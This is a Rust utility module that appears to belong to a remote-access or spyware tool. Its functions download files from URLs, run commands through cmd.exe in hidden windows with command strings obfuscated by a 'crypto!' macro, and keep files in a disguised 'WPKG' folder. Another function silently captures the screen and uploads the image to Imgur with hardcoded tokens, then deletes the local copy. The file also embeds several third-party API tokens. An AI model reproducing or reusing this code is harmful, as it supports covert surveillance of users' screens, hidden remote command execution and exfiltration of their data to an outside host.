extern crate systemstat;

#[cfg(target_os = "windows")]
use crate::crypto;
use anyhow::anyhow;
use anyhow::Context;
use std::fs;
use std::fs::File;
use std::io;
use std::io::Cursor;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use std::process::Command;

use imgurs::ImgurClient;
use rand::prelude::*;
use screenshots::Screen;
use systemstat::{saturating_sub_bytes, Platform, System};

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;
#[cfg(target_os = "windows")]
const DETACHED_PROCESS: u32 = 0x00000008;

pub async fn download_string(url: &str) -> reqwest::Result<String> {
    reqwest::get(url).await?.text().await
}

pub async fn download_from_url(url: &str, path: &str) -> anyhow::Result<()> {
    let resp = reqwest::get(url).await?;

    let mut out = File::create(path)?;
    let mut content = Cursor::new(resp.bytes().await?);

    io::copy(&mut content, &mut out)?;

    Ok(())
}

// pub fn run_process_real(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {
//     if wait {
//         Command::new(exe).args(args).output()?;
//     } else {
//         Command::new(exe).args(args).spawn()?;
//     }
//     Ok(())
// }

pub fn run_process(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {
    let mut full_command: Vec<String> = vec![];

    #[cfg(target_os = "windows")]
    {
        full_command.push(crypto!("cmd.exe"));
        full_command.push(crypto!("/c"));
        if !wait {
            full_command.push(crypto!("start"));
        }
    }

    full_command.push(exe.to_owned());
    for arg in args {
        full_command.push(arg.to_owned());
    }

    let mut command = Command::new(full_command[0].clone());
    command.args(full_command[1..full_command.len()].to_vec());

    #[cfg(target_os = "windows")]
    command.creation_flags(CREATE_NO_WINDOW);

    if wait {
        command.output()?;
    } else {
        command.spawn()?;
    }

    Ok(())
}

pub fn run_process_with_work_dir(
    exe: &str,
    args: Vec<&str>,
    wait: bool,
    current_dir: &str,
) -> anyhow::Result<()> {
    let mut full_command: Vec<String> = vec![];

    #[cfg(target_os = "windows")]
    {
        full_command.push(crypto!("cmd.exe"));
        full_command.push(crypto!("/c"));
        if !wait {
            full_command.push(crypto!("start"));
        }
    }

    full_command.push(exe.to_string());
    for arg in args {
        full_command.push(arg.to_string());
    }
    let mut command = Command::new(full_command[0].clone());
    command.args(full_command[1..full_command.len()].to_vec());
    command.current_dir(current_dir);
    #[cfg(target_os = "windows")]
    command.creation_flags(CREATE_NO_WINDOW);

    if wait {
        command.output()?;
    } else {
        command.spawn()?;
    }
    Ok(())
}

pub fn get_working_dir() -> anyhow::Result<String> {
    #[cfg(not(target_os = "windows"))]
    {
        use std::env;
        return Ok(env::current_dir()?.display().to_string());
    }

    #[cfg(target_os = "windows")]
    {
        use platform_dirs::AppDirs;
        use std::path::Path;

        let app_dirs = AppDirs::new(Some("WPKG"), true).context("Error")?;
        let config_dir = app_dirs.config_dir.display().to_string();

        if !Path::new(&config_dir).exists() {
            fs::create_dir(&config_dir)?;
        }

        Ok(config_dir)
    }
}

pub fn screenshot() -> anyhow::Result<String> {
    let screens = Screen::all().ok_or_else(|| anyhow!("Can't take ss!"))?;

    if screens.is_empty() {
        return Err(anyhow!("Screen is empty"));
    }

    let image = screens
        .get(0)
        .context("Could not find screens")?
        .capture()
        .context("empty img")?;
    let buffer = image.buffer();

    // Save the image.
    let mut rng = rand::thread_rng();
    let save_path = format!("{}/img-{}.png", get_working_dir()?, rng.gen::<i32>());
    fs::write(&save_path, &buffer)?;

    Ok(save_path)
}

const IMGUR_TOKENS: &'static [&str] = &[
    "037a0d9b9dc5ce6",
    "3e3ce0d7ac14d56",
    "6998c6570722be5",
    "80772b2547d94b0",
    "a3e9a9b3ba6a1f8",
];

pub async fn screenshot_url() -> anyhow::Result<String> {
    let path = screenshot()?;
    let info = ImgurClient::new(IMGUR_TOKENS[4])
        .upload_image(&path)
        .await?;

    tokio::spawn(async {
        fs::remove_file(path).unwrap();
    });

    Ok(info.data.link)
}

pub fn stat() -> String {
    // get system status
    let sys = System::new();

    // init variables
    let mut cpu_usage = 0.;
    let mut memory_free = 0;
    let mut memory_total = 0;
    let mut swap_free = 0;
    let mut swap_total = 0;

    // get cpu usage
    if let Ok(cpu) = sys.cpu_load_aggregate() {
        //thread::sleep(Duration::from_secs(1));
        let cpu = cpu.done().unwrap();
        cpu_usage = cpu.user * 100.0;
    }

    // get memory usage
    if let Ok(mem) = sys.memory() {
        memory_free = saturating_sub_bytes(mem.total, mem.free).as_u64();
        memory_total = mem.total.as_u64();
    }

    // get swap usage
    if let Ok(swap) = sys.swap() {
        swap_free = saturating_sub_bytes(swap.total, swap.free).as_u64();
        swap_total = swap.total.as_u64();
    }

    // return stats
    format!(
        "{} {} {} {} {}",
        cpu_usage, memory_free, memory_total, swap_free, swap_total
    )
}
